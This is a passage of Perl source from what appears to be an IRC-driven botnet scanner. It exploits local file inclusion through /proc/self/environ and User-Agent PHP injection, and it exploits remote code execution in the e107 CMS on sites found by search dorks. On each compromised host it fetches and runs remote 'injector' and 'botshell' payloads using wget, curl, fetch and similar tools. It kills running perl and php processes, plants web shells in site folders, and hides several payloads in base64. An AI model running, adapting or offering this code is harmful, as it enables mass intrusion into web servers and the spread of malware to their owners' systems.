                  "../../../../../..",
                  "../../../../..",
                  "../../../..",
                  "../../..",
                  "../..",
                  "..");
         foreach my $dir (@dirs) {      
            my $test = "http://".$site.$bug.$dir."/proc/self/environ%0000";
            my $vuln = "http://".$site."13".$bug.$dir."/proc/self/environ%0000";
            my $shell = "http://".$site."13".$bug.$dir."/tmp/ripper%0000";
            my $html = &get_content($test);
            if ($html =~ /DOCUMENT_ROOT=\// && $html =~ /HTTP_USER_AGENT/) {
               if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else {
                  my $code = 'echo "c0li#".php_uname()."#c0li".get_current_user();if(@copy("'.$botshell.'","/tmp/ripper")) { echo "SUCCESS";@copy("'.$injector.'","/tmp/dev"); }';
                  my $res = lfi_env_query($test,encode_base64($code));
                  &lfi_spread_query($test);
                  &get_content("http://".$site.$bug.$dir."/tmp/ripper%0000");
                  $res =~ s/\n//g;
                  if ($res =~ /c0li#(.*)#c0li(.*)SUCCESS/sg) {
                     my $sys = $1;
                     $nob0dy = $2;
                     &msg("$chan","$lfilogo 12(4@0$engine12)(4@8SHELL12)13 ".$shell." 12(4@8".$sys."12)  $nob0dy");sleep(2);
                  }
                  elsif ($res =~ /c0li#(.*)#c0li(.*)/sg) {
                     if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else {
                        my $sys = $1;
                        $nob0dy = $2;
                        my $upload = 'passthru("killall -9 perl; killall -9 php; wget '.$injector.' -O /tmp/dev; fetch -O /tmp/dev '.$injector.'; cUrl -O /tmp/dev '.$injector.'; lynx -dump '.$injector.' /tmp/dev; GET '.$injector.'>/tmp/dev; lwp-download '.$injector.' /tmp/dev; wget '.$botshell.' -O /tmp/ripper; fetch -O /tmp/ripper '.$botshell.'; cUrl -O /tmp/ripper '.$botshell.'; lynx -dump '.$botshell.' /tmp/ripper; GET '.$botshell.'>/tmp/ripper; lwp-download '.$botshell.' /tmp/ripper*"); exec("killall -9 perl; killall -9 php; wget '.$injector.' -O /tmp/dev; fetch -O /tmp/dev '.$injector.'; cUrl -O /tmp/dev '.$injector.'; lynx -dump '.$injector.' /tmp/dev; GET '.$injector.'>/tmp/dev; lwp-download '.$injector.' /tmp/dev; wget '.$botshell.' -O /tmp/ripper; fetch -O /tmp/ripper '.$botshell.'; cUrl -O /tmp/ripper '.$botshell.'; lynx -dump '.$botshell.' /tmp/ripper; GET '.$botshell.'>/tmp/ripper; lwp-download '.$botshell.' /tmp/ripper*"); system("killall -9 perl; killall -9 php; wget '.$injector.' -O /tmp/dev; fetch -O /tmp/dev '.$injector.'; cUrl -O /tmp/dev '.$injector.'; lynx -dump '.$injector.' /tmp/dev; GET '.$injector.'>/tmp/dev; lwp-download '.$injector.' /tmp/dev; wget '.$botshell.' -O /tmp/ripper; fetch -O /tmp/ripper '.$botshell.'; cUrl -O /tmp/ripper '.$botshell.'; lynx -dump '.$botshell.' /tmp/ripper; GET '.$botshell.'>/tmp/ripper; lwp-download '.$botshell.' /tmp/ripper*"); shell_exec("killall -9 perl; killall -9 php; wget '.$injector.' -O /tmp/dev; fetch -O /tmp/dev '.$injector.'; cUrl -O /tmp/dev '.$injector.'; lynx -dump '.$injector.' /tmp/dev; GET '.$injector.'>/tmp/dev; lwp-download '.$injector.' /tmp/dev; wget '.$botshell.' -O /tmp/ripper; fetch -O /tmp/ripper '.$botshell.'; cUrl -O /tmp/ripper '.$botshell.'; lynx -dump '.$botshell.' /tmp/ripper; GET '.$botshell.'>/tmp/ripper; lwp-download '.$botshell.' /tmp/ripper*");';
                        my $wget = lfi_env_query($test,encode_base64($upload)); sleep(2);
                        my $check = &get_content("http://".$site.$bug.$dir."/tmp/ripper%0000"); sleep(2);
                        if ($check =~ /<b>ID:<\/b> 0wn3d<\/font><br>/) {
                           &msg("$chan","$lfilogo 12(4@0$engine12)(4@8SHELL12)13 ".$shell." 12(4@8".$sys."12)  $nob0dy");sleep(2);
                        }   
                        else {
                           &msg("$chan","$lfilogo 12(4@0$engine12)(4@7SYSTEM12)11 ".$vuln." 12(4@7".$sys."12)  $nob0dy");sleep(2);
                        }
                     } exit; }
                  }
                  else { &msg("$chan","$lfilogo 12(4@0$engine12)(4@9ENVIRON12)11 ".$vuln); }
               } exit; } sleep(2);
            }
         }
        }
    }
}

sub lfi_env_query() {
    my $url = $_[0];
    my $code = $_[1];
    my $ua = LWP::UserAgent->new(agent => "<? eval(base64_decode('".$code."')); ?>");
    $ua->timeout(7);
    my $req = HTTP::Request->new(GET => $url);
    my $res = $ua->request($req);
    return $res->content;
}

sub lfi_spread_query() {
    my $url = $_[0];
    my $code = "ZXhlYygnY2QgL3RtcDsgd2dldCAiLiRpbmplY3Rvci4iIC1PIHBiLnBocDsgY2htb2QgNzU1IHBiLnBocDsgcGhwIHBiLnBocDsgZmV0Y2ggLU8gcGIucGhwICIuJGluamVjdG9yLiI7IGNobW9kIDc1NSBwYi5waHA7IHBocCBwYi5waHA7IGNVcmwgLU8gcGIucGhwICIuJGluamVjdG9yLiI7IGNobW9kIDc1NSBwYi5waHA7IHBocCBwYi5waHA7IGx5bnggLWR1bXAgIi4kaW5qZWN0b3IuIiBwYi5waHA7IGNobW9kIDc1NSBwYi5waHA7IHBocCBwYi5waHA7IEdFVCAiLiRpbmplY3Rvci4iPnBiLnBocDsgY2htb2QgNzU1IHBiLnBocDsgcGhwIHBiLnBocDsgbHdwLWRvd25sb2FkICIuJGluamVjdG9yLiIgcGIucGhwOyBjaG1vZCA3NTUgcGIucGhwOyBwaHAgcGIucGhwOyB3Z2V0ICIuJGJvdGFrLiIgLU8gc2IudHh0OyBjaG1vZCA3NTUgc2IudHh0OyBwZXJsIHNiLnR4dDsgZmV0Y2ggLU8gc2IudHh0ICIuJGJvdGFrLiI7IGNobW9kIDc1NSBzYi50eHQ7IHBlcmwgc2IudHh0OyBjVXJsIC1PIHNiLnR4dCAiLiRib3Rhay4iOyBjaG1vZCA3NTUgc2IudHh0OyBwZXJsIHNiLnR4dDsgbHlueCAtZHVtcCAiLiRib3Rhay4iIHNiLnR4dDsgY2htb2QgNzU1IHNiLnR4dDsgcGVybCBzYi50eHQ7IEdFVCAiLiRib3Rhay4iPnNiLnR4dDsgY2htb2QgNzU1IHNiLnR4dDsgcGVybCBzYi50eHQ7IGx3cC1kb3dubG9hZCAiLiRib3Rhay4iIHNiLnR4dDsgY2htb2QgNzU1IHNiLnR4dDsgcGVybCBzYi50eHQqJyk7IHNoZWxsX2V4ZWMoJ2NkIC90bXA7IHdnZXQgIi4kaW5qZWN0b3IuIiAtTyBwYi5waHA7IGNobW9kIDc1NSBwYi5waHA7IHBocCBwYi5waHA7IGZldGNoIC1PIHBiLnBocCAiLiRpbmplY3Rvci4iOyBjaG1vZCA3NTUgcGIucGhwOyBwaHAgcGIucGhwOyBjVXJsIC1PIHBiLnBocCAiLiRpbmplY3Rvci4iOyBjaG1vZCA3NTUgcGIucGhwOyBwaHAgcGIucGhwOyBseW54IC1kdW1wICIuJGluamVjdG9yLiIgcGIucGhwOyBjaG1vZCA3NTUgcGIucGhwOyBwaHAgcGIucGhwOyBHRVQgIi4kaW5qZWN0b3IuIj5wYi5waHA7IGNobW9kIDc1NSBwYi5waHA7IHBocCBwYi5waHA7IGx3cC1kb3dubG9hZCAiLiRpbmplY3Rvci4iIHBiLnBocDsgY2htb2QgNzU1IHBiLnBocDsgcGhwIHBiLnBocDsgd2dldCAiLiRib3Rhay4iIC1PIHNiLnR4dDsgY2htb2QgNzU1IHNiLnR4dDsgcGVybCBzYi50eHQ7IGZldGNoIC1PIHNiLnR4dCAiLiRib3Rhay4iOyBjaG1vZCA3NTUgc2IudHh0OyBwZXJsIHNiLnR4dDsgY1VybCAtTyBzYi50eHQgIi4kYm90YWsuIjsgY2htb2QgNzU1IHNiLnR4dDsgcGVybCBzYi50eHQ7IGx5bnggLWR1bXAgIi4kYm90YWsuIiBzYi50eHQ7IGNobW9kIDc1NSBzYi50eHQ7IHBlcmwgc2IudHh0OyBHRVQgIi4kYm90YWsuIj5zYi50eHQ7IGNobW9kIDc1NSBzYi50eHQ7IHBlcmwgc2IudHh0OyBsd3AtZG93bmxvYWQgIi4kYm90YWsuIiBzYi50eHQ7IGNobW9kIDc1NSBzYi50eHQ7IHBlcmwgc2IudHh0KicpOyBzeXN0ZW0oJ2NkIC90bXA7IHdnZXQgIi4kaW5qZWN0b3IuIiAtTyBwYi5waHA7IGNobW9kIDc1NSBwYi5waHA7IHBocCBwYi5waHA7IGZldGNoIC1PIHBiLnBocCAiLiRpbmplY3Rvci4iOyBjaG1vZCA3NTUgcGIucGhwOyBwaHAgcGIucGhwOyBjVXJsIC1PIHBiLnBocCAiLiRpbmplY3Rvci4iOyBjaG1vZCA3NTUgcGIucGhwOyBwaHAgcGIucGhwOyBseW54IC1kdW1wICIuJGluamVjdG9yLiIgcGIucGhwOyBjaG1vZCA3NTUgcGIucGhwOyBwaHAgcGIucGhwOyBHRVQgIi4kaW5qZWN0b3IuIj5wYi5waHA7IGNobW9kIDc1NSBwYi5waHA7IHBocCBwYi5waHA7IGx3cC1kb3dubG9hZCAiLiRpbmplY3Rvci4iIHBiLnBocDsgY2htb2QgNzU1IHBiLnBocDsgcGhwIHBiLnBocDsgd2dldCAiLiRib3Rhay4iIC1PIHNiLnR4dDsgY2htb2QgNzU1IHNiLnR4dDsgcGVybCBzYi50eHQ7IGZldGNoIC1PIHNiLnR4dCAiLiRib3Rhay4iOyBjaG1vZCA3NTUgc2IudHh0OyBwZXJsIHNiLnR4dDsgY1VybCAtTyBzYi50eHQgIi4kYm90YWsuIjsgY2htb2QgNzU1IHNiLnR4dDsgcGVybCBzYi50eHQ7IGx5bnggLWR1bXAgIi4kYm90YWsuIiBzYi50eHQ7IGNobW9kIDc1NSBzYi50eHQ7IHBlcmwgc2IudHh0OyBHRVQgIi4kYm90YWsuIj5zYi50eHQ7IGNobW9kIDc1NSBzYi50eHQ7IHBlcmwgc2IudHh0OyBsd3AtZG93bmxvYWQgIi4kYm90YWsuIiBzYi50eHQ7IGNobW9kIDc1NSBzYi50eHQ7IHBlcmwgc2IudHh0KicpOyAgcGFzc3RocnUoJ2NkIC90bXA7IHdnZXQgIi4kaW5qZWN0b3IuIiAtTyBwYi5waHA7IGNobW9kIDc1NSBwYi5waHA7IHBocCBwYi5waHA7IGZldGNoIC1PIHBiLnBocCAiLiRpbmplY3Rvci4iOyBjaG1vZCA3NTUgcGIucGhwOyBwaHAgcGIucGhwOyBjVXJsIC1PIHBiLnBocCAiLiRpbmplY3Rvci4iOyBjaG1vZCA3NTUgcGIucGhwOyBwaHAgcGIucGhwOyBseW54IC1kdW1wICIuJGluamVjdG9yLiIgcGIucGhwOyBjaG1vZCA3NTUgcGIucGhwOyBwaHAgcGIucGhwOyBHRVQgIi4kaW5qZWN0b3IuIj5wYi5waHA7IGNobW9kIDc1NSBwYi5waHA7IHBocCBwYi5waHA7IGx3cC1kb3dubG9hZCAiLiRpbmplY3Rvci4iIHBiLnBocDsgY2htb2QgNzU1IHBiLnBocDsgcGhwIHBiLnBocDsgd2dldCAiLiRib3Rhay4iIC1PIHNiLnR4dDsgY2htb2QgNzU1IHNiLnR4dDsgcGVybCBzYi50eHQ7IGZldGNoIC1PIHNiLnR4dCAiLiRib3Rhay4iOyBjaG1vZCA3NTUgc2IudHh0OyBwZXJsIHNiLnR4dDsgY1VybCAtTyBzYi50eHQgIi4kYm90YWsuIjsgY2htb2QgNzU1IHNiLnR4dDsgcGVybCBzYi50eHQ7IGx5bnggLWR1bXAgIi4kYm90YWsuIiBzYi50eHQ7IGNobW9kIDc1NSBzYi50eHQ7IHBlcmwgc2IudHh0OyBHRVQgIi4kYm90YWsuIj5zYi50eHQ7IGNobW9kIDc1NSBzYi50eHQ7IHBlcmwgc2IudHh0OyBsd3AtZG93bmxvYWQgIi4kYm90YWsuIiBzYi50eHQ7IGNobW9kIDc1NSBzYi50eHQ7IHBlcmwgc2IudHh0KicpOw==";
    my $ua = LWP::UserAgent->new(agent => "<? eval(base64_decode('".encode_base64($code)."')); ?>");
    $ua->timeout(7);
    my $req = HTTP::Request->new(GET => $url);
    my $res = $ua->request($req);
}

######################## e107
sub e107() {
   my ($chan,$bug,$dork,$engine) = @_;
    my $count = 0;
    my @list = &search_engine($chan,$bug,$dork,$engine,$e107logo);
    my $num = scalar(@list);
    if ($num > 0) {
        foreach my $site (@list) {
            $count++;
            if ($count == $num-1) { if ($conf{ssdone} == 1) { &msg("$chan","$e107logo 12(4@0$engine12) 10==14F10=15I10=0N10=0I10=15S10=14H10== "); } }
            my $test = "http://".$site.$bug;
            my $code = "ZWNobyAidjBwQ3Izdzxicj4iOw0KZWNobyAic3lzOiIucGhwX3VuYW1lKCkuIjxicj4iOw0KJGNtZD0iZWNobyBub2IwZHlDcjN3IjsNCiRlc2VndWljbWQ9ZXgoJGNtZCk7DQplY2hvICRlc2VndWljbWQ7DQpmdW5jdGlvbiBleCgkY2ZlKXsNCiRyZXMgPSAnJzsNCmlmICghZW1wdHkoJGNmZSkpew0KaWYoZnVuY3Rpb25fZXhpc3RzKCdleGVjJykpew0KQGV4ZWMoJGNmZSwkcmVzKTsNCiRyZXMgPSBqb2luKCJcbiIsJHJlcyk7DQp9DQplbHNlaWYoZnVuY3Rpb25fZXhpc3RzKCdzaGVsbF9leGVjJykpew0KJHJlcyA9IEBzaGVsbF9leGVjKCRjZmUpOw0KfQ0KZWxzZWlmKGZ1bmN0aW9uX2V4aXN0cygnc3lzdGVtJykpew0KQG9iX3N0YXJ0KCk7DQpAc3lzdGVtKCRjZmUpOw0KJHJlcyA9IEBvYl9nZXRfY29udGVudHMoKTsNCkBvYl9lbmRfY2xlYW4oKTsNCn0NCmVsc2VpZihmdW5jdGlvbl9leGlzdHMoJ3Bhc3N0aHJ1Jykpew0KQG9iX3N0YXJ0KCk7DQpAcGFzc3RocnUoJGNmZSk7DQokcmVzID0gQG9iX2dldF9jb250ZW50cygpOw0KQG9iX2VuZF9jbGVhbigpOw0KfQ0KZWxzZWlmKEBpc19yZXNvdXJjZSgkZiA9IEBwb3BlbigkY2ZlLCJyIikpKXsNCiRyZXMgPSAiIjsNCndoaWxlKCFAZmVvZigkZikpIHsgJHJlcyAuPSBAZnJlYWQoJGYsMTAyNCk7IH0NCkBwY2xvc2UoJGYpOw0KfX0NCnJldHVybiAkcmVzOw0KfQ==";
            my $html = &e107_rce_query($test,$code);
            if ($html =~ /v0pCr3w<br>sys:(.+?)<br>nob0dyCr3w/) {
                if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else {
                    my $sys = $1;
                    my $upload = 'if(@copy("'.$injector.'","pb.php")) { echo "c0liSUKSESc0li";@copy("'.$botshell.'","h4rd.php"); } elseif(@copy("'.$injector.'","e107_themes/pb.php")) { echo "stun_dthem";@copy("'.$botshell.'","e107_themes/h4rd.php"); } elseif(@copy("'.$injector.'","e107_plugins/pb.php")) { echo "stun_dplug";@copy("'.$botshell.'","e107_plugins/h4rd.php"); } elseif(@copy("'.$injector.'","e107_images/pb.php")) { echo "stun_dima";@copy("'.$botshell.'","e107_images/h4rd.php");}eval(include("'.$injector.'"));';
                    my $res = &e107_rce_query($test,encode_base64($upload));
                    if ($res =~ /c0liSUKSESc0li/) {
                  &get_content("http://".$site."pb.php"); my $dor = "http://".$site."h4rd.php"; &info_main($dor,$chan,$engine,$e107logo); sleep(1);
               }
                    elsif ($res =~ /stun_dthem/) {
                  &get_content("http://".$site."e107_themes/pb.php"); my $dor = "http://".$site."e107_themes/h4rd.php"; &info_main($dor,$chan,$engine,$e107logo); sleep(1);
               }
                    elsif ($res =~ /stun_dplug/) {
                  &get_content("http://".$site."e107_plugins/pb.php"); my $dor = "http://".$site."e107_plugins/h4rd.php"; &info_main($dor,$chan,$engine,$e107logo); sleep(1);
               }
                    elsif ($res =~ /stun_dima/) {
                  &get_content("http://".$site."e107_images/pb.php"); my $dor = "http://".$site."e107_images/h4rd.php"; &info_main($dor,$chan,$engine,$e107logo); sleep(1);
               }
                    else {
                  &msg("$chan","$e107logo 12(4@0$engine12)(4@7VULN12)11 ".$test." 12(4@7".$sys."12)(4@0safemode-9OFF12) ");sleep(2);
                  my $dor = "http://".$site."h4rd.php";
                  my $check = &get_content($dor); &get_content("http://".$site."pb.php");
                  if ($check =~ /<font face='verdana' size='2'><b>ID:<\/b> 0wn3d<\/font><br>/) {
                  &info_main($dor,$chan,$engine,$e107logo);
                  }
               }
                    &e107_spread_query($test);
                    sleep(2);
                } exit; } sleep(2);
            }
            elsif ($html =~ /v0pCr3w<br>sys:(.+?)<br>/) {
                if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else {
                    my $sys = $1;
                    my $upload = 'if(@copy("'.$injector.'","pb.php")) { echo "c0liSUKSESc0li";@copy("'.$botshell.'","h4rd.php"); } elseif(@copy("'.$injector.'","e107_themes/pb.php")) { echo "stun_dthem";@copy("'.$botshell.'","e107_themes/h4rd.php"); } elseif(@copy("'.$injector.'","e107_plugins/pb.php")) { echo "stun_dplug";@copy("'.$botshell.'","e107_plugins/h4rd.php"); } elseif(@copy("'.$injector.'","e107_images/pb.php")) { echo "stun_dima";@copy("'.$botshell.'","e107_images/h4rd.php");}eval(include("'.$injector.'"));';
                    my $res = &e107_rce_query($test,encode_base64($upload));
                    if ($res =~ /c0liSUKSESc0li/) {
                  &get_content("http://".$site."pb.php"); my $dor = "http://".$site."h4rd.php"; &info_main($dor,$chan,$engine,$e107logo); sleep(1);
               }
                    elsif ($res =~ /stun_dthem/) {
                  &get_content("http://".$site."e107_themes/pb.php"); my $dor = "http://".$site."e107_themes/h4rd.php"; &info_main($dor,$chan,$engine,$e107logo); sleep(1);
                  }
                    elsif ($res =~ /stun_dplug/) {
                  &get_content("http://".$site."e107_plugins/pb.php"); my $dor = "http://".$site."e107_plugins/h4rd.php"; &info_main($dor,$chan,$engine,$e107logo); sleep(1);
                  }
                    elsif ($res =~ /stun_dima/) {
                  &get_content("http://".$site."e107_images/pb.php"); my $dor = "http://".$site."e107_images/h4rd.php"; &info_main($dor,$chan,$engine,$e107logo); sleep(1);
                  }
                    else {
                  &msg("$chan","$e107logo 12(4@0$engine12)(4@7VULN12)11 ".$test." 12(4@7".$sys."12)(4@0safemode-4ON12) ");sleep(2);
                  my $dor = "http://".$site."h4rd.php";
                  my $check = &get_content($dor); &get_content("http://".$site."pb.php");
                  if ($check =~ /<font face='verdana' size='2'><b>ID:<\/b> 0wn3d<\/font><br>/) {
                  &info_main($dor,$chan,$engine,$e107logo);
                  }
               }
            &e107_spread_query($test);
                sleep(2); } exit; }
            }
        }
    }
}

sub e107_rce_query() {
    my $url = $_[0];
    my $code = $_[1];
   my $cod2 = "aWYoZnVuY3Rpb25fZXhpc3RzKCdleGVjJykpew0KQGV4ZWMoImNkIC90bXAgJiYgd2dldCAiLiRpbmplY3Rvci4iIC1PIHBiLnBocCAmJiBjaG1vZCA3NTUgcGIucGhwICYmIHJtIC1yZiBwYi5waHAuKiAmJiBwaHAgcGIucGhwICYmIHdnZXQgIi4kYm90c2hlbGwuIiAtTyBoNHJkLnBocCAmJiBjaG1vZCA3NTUgaDRyZC5waHAgJiYgcm0gLXJmIGg0cmQucGhwLioiKTsNCkBleGVjKCJjZCAvdG1wICYmIGZldGNoIC1PIHBiLnBocCAiLiRpbmplY3Rvci4iICYmIGNobW9kIDc1NSBwYi5waHAgJiYgcm0gLXJmIHBiLnBocC4qICYmIHBocCBwYi5waHAgJiYgZmV0Y2ggLU8gaDRyZC5waHAgIi4kYm90c2hlbGwuIiAmJiBjaG1vZCA3NTUgaDRyZC5waHAgJiYgcm0gLXJmIGg0cmQucGhwLioiKTsNCkBleGVjKCJjZCAvdG1wICYmIGNVcmwgLU8gcGIucGhwICIuJGluamVjdG9yLiIgJiYgY2htb2QgNzU1IHBiLnBocCAmJiBybSAtcmYgcGIucGhwLiogJiYgcGhwIHBiLnBocCAmJiBjVXJsIC1PIGg0cmQucGhwICIuJGJvdHNoZWxsLiIgJiYgY2htb2QgNzU1IGg0cmQucGhwICYmIHJtIC1yZiBoNHJkLnBocC4qIik7DQpAZXhlYygiY2QgL3RtcCAmJiBseW54IC1kdW1wICIuJGluamVjdG9yLiIgcGIucGhwICYmIGNobW9kIDc1NSBwYi5waHAgJiYgcm0gLXJmIHBiLnBocC4qICYmIHBocCBwYi5waHAgJiYgbHlueCAtZHVtcCAiLiRib3RzaGVsbC4iIGg0cmQucGhwICYmIGNobW9kIDc1NSBoNHJkLnBocCAmJiBybSAtcmYgaDRyZC5waHAuKiIpOw0KQGV4ZWMoImNkIC90bXAgJiYgR0VUICIuJGluamVjdG9yLiI+cGIucGhwICYmIGNobW9kIDc1NSBwYi5waHAgJiYgcm0gLXJmIHBiLnBocC4qICYmIHBocCBwYi5waHAgJiYgR0VUICIuJGJvdHNoZWxsLiI+aDRyZC5waHAgJiYgY2htb2QgNzU1IGg0cmQucGhwICYmIHJtIC1yZiBoNHJkLnBocC4qIik7DQpAZXhlYygiY2QgL3RtcCAmJiBsd3AtZG93bmxvYWQgIi4kaW5qZWN0b3IuIiBwYi5waHAgJiYgY2htb2QgNzU1IHBiLnBocCAmJiBybSAtcmYgcGIucGhwLiogJiYgcGhwIHBiLnBocCAmJiBsd3AtZG93bmxvYWQgIi4kYm90c2hlbGwuIiBoNHJkLnBocCAmJiBjaG1vZCA3NTUgaDRyZC5waHAgJiYgcm0gLXJmIGg0cmQucGhwLioiKTsNCn0NCmVsc2VpZihmdW5jdGlvbl9leGlzdHMoJ3NoZWxsX2V4ZWMnKSl7DQpAc2hlbGxfZXhlYygiY2QgL3RtcCAmJiB3Z2V0ICIuJGluamVjdG9yLiIgLU8gcGIucGhwICYmIGNobW9kIDc1NSBwYi5waHAgJiYgcm0gLXJmIHBiLnBocC4qICYmIHBocCBwYi5waHAgJiYgd2dldCAiLiRib3RzaGVsbC4iIC1PIGg0cmQucGhwICYmIGNobW9kIDc1NSBoNHJkLnBocCAmJiBybSAtcmYgaDRyZC5waHAuKiIpOw0KQHNoZWxsX2V4ZWMoImNkIC90bXAgJiYgZmV0Y2ggLU8gcGIucGhwICIuJGluamVjdG9yLiIgJiYgY2htb2QgNzU1IHBiLnBocCAmJiBybSAtcmYgcGIucGhwLiogJiYgcGhwIHBiLnBocCAmJiBmZXRjaCAtTyBoNHJkLnBocCAiLiRib3RzaGVsbC4iICYmIGNobW9kIDc1NSBoNHJkLnBocCAmJiBybSAtcmYgaDRyZC5waHAuKiIpOw0KQHNoZWxsX2V4ZWMoImNkIC90bXAgJiYgY1VybCAtTyBwYi5waHAgIi4kaW5qZWN0b3IuIiAmJiBjaG1vZCA3NTUgcGIucGhwICYmIHJtIC1yZiBwYi5waHAuKiAmJiBwaHAgcGIucGhwICYmIGNVcmwgLU8gaDRyZC5waHAgIi4kYm90c2hlbGwuIiAmJiBjaG1vZCA3NTUgaDRyZC5waHAgJiYgcm0gLXJmIGg0cmQucGhwLioiKTsNCkBzaGVsbF9leGVjKCJjZCAvdG1wICYmIGx5bnggLWR1bXAgIi4kaW5qZWN0b3IuIiBwYi5waHAgJiYgY2htb2QgNzU1IHBiLnBocCAmJiBybSAtcmYgcGIucGhwLiogJiYgcGhwIHBiLnBocCAmJiBseW54IC1kdW1wICIuJGJvdHNoZWxsLiIgaDRyZC5waHAgJiYgY2htb2QgNzU1IGg0cmQucGhwICYmIHJtIC1yZiBoNHJkLnBocC4qIik7DQpAc2hlbGxfZXhlYygiY2QgL3RtcCAmJiBHRVQgIi4kaW5qZWN0b3IuIj5wYi5waHAgJiYgY2htb2QgNzU1IHBiLnBocCAmJiBybSAtcmYgcGIucGhwLiogJiYgcGhwIHBiLnBocCAmJiBHRVQgIi4kYm90c2hlbGwuIj5oNHJkLnBocCAmJiBjaG1vZCA3NTUgaDRyZC5waHAgJiYgcm0gLXJmIGg0cmQucGhwLioiKTsNCkBzaGVsbF9leGVjKCJjZCAvdG1wICYmIGx3cC1kb3dubG9hZCAiLiRpbmplY3Rvci4iIHBiLnBocCAmJiBjaG1vZCA3NTUgcGIucGhwICYmIHJtIC1yZiBwYi5waHAuKiAmJiBwaHAgcGIucGhwICYmIGx3cC1kb3dubG9hZCAiLiRib3RzaGVsbC4iIGg0cmQucGhwICYmIGNobW9kIDc1NSBoNHJkLnBocCAmJiBybSAtcmYgaDRyZC5waHAuKiIpOw0KfQ0KZWxzZWlmKGZ1bmN0aW9uX2V4aXN0cygnc3lzdGVtJykpew0KQHN5c3RlbSgiY2QgL3RtcCAmJiB3Z2V0ICIuJGluamVjdG9yLiIgLU8gcGIucGhwICYmIGNobW9kIDc1NSBwYi5waHAgJiYgcm0gLXJmIHBiLnBocC4qICYmIHBocCBwYi5waHAgJiYgd2dldCAiLiRib3RzaGVsbC4iIC1PIGg0cmQucGhwICYmIGNobW9kIDc1NSBoNHJkLnBocCAmJiBybSAtcmYgaDRyZC5waHAuKiIpOw0KQHN5c3RlbSgiY2QgL3RtcCAmJiBmZXRjaCAtTyBwYi5waHAgIi4kaW5qZWN0b3IuIiAmJiBjaG1vZCA3NTUgcGIucGhwICYmIHJtIC1yZiBwYi5waHAuKiAmJiBwaHAgcGIucGhwICYmIGZldGNoIC1PIGg0cmQucGhwICIuJGJvdHNoZWxsLiIgJiYgY2htb2QgNzU1IGg0cmQucGhwICYmIHJtIC1yZiBoNHJkLnBocC4qIik7DQpAc3lzdGVtKCJjZCAvdG1wICYmIGNVcmwgLU8gcGIucGhwICIuJGluamVjdG9yLiIgJiYgY2htb2QgNzU1IHBiLnBocCAmJiBybSAtcmYgcGIucGhwLiogJiYgcGhwIHBiLnBocCAmJiBjVXJsIC1PIGg0cmQucGhwICIuJGJvdHNoZWxsLiIgJiYgY2htb2QgNzU1IGg0cmQucGhwICYmIHJtIC1yZiBoNHJkLnBocC4qIik7DQpAc3lzdGVtKCJjZCAvdG1wICYmIGx5bnggLWR1bXAgIi4kaW5qZWN0b3IuIiBwYi5waHAgJiYgY2htb2QgNzU1IHBiLnBocCAmJiBybSAtcmYgcGIucGhwLiogJiYgcGhwIHBiLnBocCAmJiBseW54IC1kdW1wICIuJGJvdHNoZWxsLiIgaDRyZC5waHAgJiYgY2htb2QgNzU1IGg0cmQucGhwICYmIHJtIC1yZiBoNHJkLnBocC4qIik7DQpAc3lzdGVtKCJjZCAvdG1wICYmIEdFVCAiLiRpbmplY3Rvci4iPnBiLnBocCAmJiBjaG1vZCA3NTUgcGIucGhwICYmIHJtIC1yZiBwYi5waHAuKiAmJiBwaHAgcGIucGhwICYmIEdFVCAiLiRib3RzaGVsbC4iPmg0cmQucGhwICYmIGNobW9kIDc1NSBoNHJkLnBocCAmJiBybSAtcmYgaDRyZC5waHAuKiIpOw0KQHN5c3RlbSgiY2QgL3RtcCAmJiBsd3AtZG93bmxvYWQgIi4kaW5qZWN0b3IuIiBwYi5waHAgJiYgY2htb2QgNzU1IHBiLnBocCAmJiBybSAtcmYgcGIucGhwLiogJiYgcGhwIHBiLnBocCAmJiBsd3AtZG93bmxvYWQgIi4kYm90c2hlbGwuIiBoNHJkLnBocCAmJiBjaG1vZCA3NTUgaDRyZC5waHAgJiYgcm0gLXJmIGg0cmQucGhwLioiKTsNCn0NCmVsc2VpZihmdW5jdGlvbl9leGlzdHMoJ3Bhc3N0aHJ1Jykpew0KQHBhc3N0aHJ1KCJjZCAvdG1wICYmIHdnZXQgIi4kaW5qZWN0b3IuIiAtTyBwYi5waHAgJiYgY2htb2QgNzU1IHBiLnBocCAmJiBybSAtcmYgcGIucGhwLiogJiYgcGhwIHBiLnBocCAmJiB3Z2V0ICIuJGJvdHNoZWxsLiIgLU8gaDRyZC5waHAgJiYgY2htb2QgNzU1IGg0cmQucGhwICYmIHJtIC1yZiBoNHJkLnBocC4qIik7DQpAcGFzc3RocnUoImNkIC90bXAgJiYgZmV0Y2ggLU8gcGIucGhwICIuJGluamVjdG9yLiIgJiYgY2htb2QgNzU1IHBiLnBocCAmJiBybSAtcmYgcGIucGhwLiogJiYgcGhwIHBiLnBocCAmJiBmZXRjaCAtTyBoNHJkLnBocCAiLiRib3RzaGVsbC4iICYmIGNobW9kIDc1NSBoNHJkLnBocCAmJiBybSAtcmYgaDRyZC5waHAuKiIpOw0KQHBhc3N0aHJ1KCJjZCAvdG1wICYmIGNVcmwgLU8gcGIucGhwICIuJGluamVjdG9yLiIgJiYgY2htb2QgNzU1IHBiLnBocCAmJiBybSAtcmYgcGIucGhwLiogJiYgcGhwIHBiLnBocCAmJiBjVXJsIC1PIGg0cmQucGhwICIuJGJvdHNoZWxsLiIgJiYgY2htb2QgNzU1IGg0cmQucGhwICYmIHJtIC1yZiBoNHJkLnBocC4qIik7DQpAcGFzc3RocnUoImNkIC90bXAgJiYgbHlueCAtZHVtcCAiLiRpbmplY3Rvci4iIHBiLnBocCAmJiBjaG1vZCA3NTUgcGIucGhwICYmIHJtIC1yZiBwYi5waHAuKiAmJiBwaHAgcGIucGhwICYmIGx5bnggLWR1bXAgIi4kYm90c2hlbGwuIiBoNHJkLnBocCAmJiBjaG1vZCA3NTUgaDRyZC5waHAgJiYgcm0gLXJmIGg0cmQucGhwLioiKTsNCkBwYXNzdGhydSgiY2QgL3RtcCAmJiBHRVQgIi4kaW5qZWN0b3IuIj5wYi5waHAgJiYgY2htb2QgNzU1IHBiLnBocCAmJiBybSAtcmYgcGIucGhwLiogJiYgcGhwIHBiLnBocCAmJiBHRVQgIi4kYm90c2hlbGwuIj5oNHJkLnBocCAmJiBjaG1vZCA3NTUgaDRyZC5waHAgJiYgcm0gLXJmIGg0cmQucGhwLioiKTsNCkBwYXNzdGhydSgiY2QgL3RtcCAmJiBsd3AtZG93bmxvYW